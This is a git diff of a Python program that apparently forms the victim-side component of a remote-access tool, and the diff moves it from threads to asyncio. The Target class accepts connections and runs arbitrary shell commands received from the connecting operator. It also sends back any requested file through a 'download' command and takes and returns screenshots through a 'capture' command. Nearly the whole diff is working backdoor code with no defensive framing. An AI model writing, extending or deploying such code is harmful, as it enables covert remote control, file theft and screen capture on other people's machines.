@@ -1,17 +1,21 @@
-from base_socket import *
-from string_coloring import CYAN
+import platform
+import os
 from PIL import ImageGrab
-import subprocess
+
+from base import *
 from spliter import commande_spliter
 
 
-class Target(MultipleClientsServerSocket):
+class Target(ServerSocket):
+
     def __init__(self):
         super().__init__()
 
-    def accept_commands(self, addr: tuple):
+    async def accept_commands(self, addr: tuple):
         while True:
-            commande = self.recv_header_and_data(recv_sock=self.clientsockets[addr]).decode(encoding=ENCODING)
+            result = None
+            commande = await recv_header_and_data(recv_sock=self.clientsockets[addr])
+            commande = commande.decode(encoding=ENCODING)
             splited_commande = commande_spliter(commande)
 
             if not commande:
@@ -31,18 +35,15 @@ class Target(MultipleClientsServerSocket):
                     os.chdir(splited_commande[1])
                     result = os.getcwd() + '\n'
                 except FileNotFoundError as err:
-                    result = colored_error(str(err))
-                    print(result)
+                    result = str(err)
 
             elif splited_commande[0] == 'download':
                 try:
                     with open(splited_commande[1], 'rb') as f:
                         result = f.read()
-                except FileNotFoundError as err:
-                    print(str(err))
+                except FileNotFoundError:
                     result = 'filenotfound'
-                except IsADirectoryError as err:
-                    print(str(err))
+                except IsADirectoryError:
                     result = 'isdir'
 
             elif splited_commande[0] == 'capture':
@@ -52,41 +53,48 @@ class Target(MultipleClientsServerSocket):
                     with open(splited_commande[1], 'rb') as img:
                         result = img.read()
                     os.remove(splited_commande[1])
-                except OSError as err:
-                    print(str(err))
+                except OSError:
                     result = 'screenshot-error'
 
             else:
-                output = subprocess.run(commande, shell=True, universal_newlines=True, capture_output=True)
-                if output.stdout is None:
-                    result = colored_error(f'❗ Erreur!')
-                elif output.stdout == '':
-                    result = colored_error(output.stderr)
-                else:
-                    result = output.stdout
+                proc = await asyncio.create_subprocess_shell(
+                    commande,
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE,
+                )
+
+                stdout, stderr = await proc.communicate()
+
+                if stdout:
+                    result = stdout
+                if stderr:
+                    result = stderr
 
             if commande.lower() != 'info':
-                print(f'{CYAN} ⌨️   > {commande}')
+                print(f' ⌨️ > {commande}')
 
-            if not result:
-                self.send_header_and_data(self.clientsockets[addr], colored_error(f'❗ Erreur!').encode())
+            if not result or result == '':
+                await send_header_and_data(self.clientsockets[addr], f'❗ No output'.encode(encoding=ENCODING))
             else:
                 if isinstance(result, str):
                     result = result.encode(encoding=ENCODING)
-                self.send_header_and_data(self.clientsockets[addr], result)
+                await send_header_and_data(self.clientsockets[addr], result)
 
-        print(colored_success(f'\n‼️ Deconnecte\n'))
+        print(f'\n‼️{addr[0]}: {addr[1]} Deconnecte\n')
         self.clientsockets[addr].close()
-
-    def handle_clients(self, addr: tuple):
-        print(f'💻 {addr} connecte 💻')
-        print(f'💻 Client(s) connecte(s): {threading.active_count()} 💻')
-        self.accept_commands(addr)
         del self.clientsockets[addr]
+
+    async def handle_clients(self, addr: tuple):
+        print(f'💻 {addr} connecte 💻')
+        task = asyncio.create_task(self.accept_commands(addr))
+        await task
+
+
+async def main():
+    target = Target()
+    task = asyncio.create_task(target.listen())
+    await task
 
 
 if __name__ == '__main__':
-
-    while True:
-        target = Target()
-        target.linsten_multiple_clients()
+    asyncio.run(main())
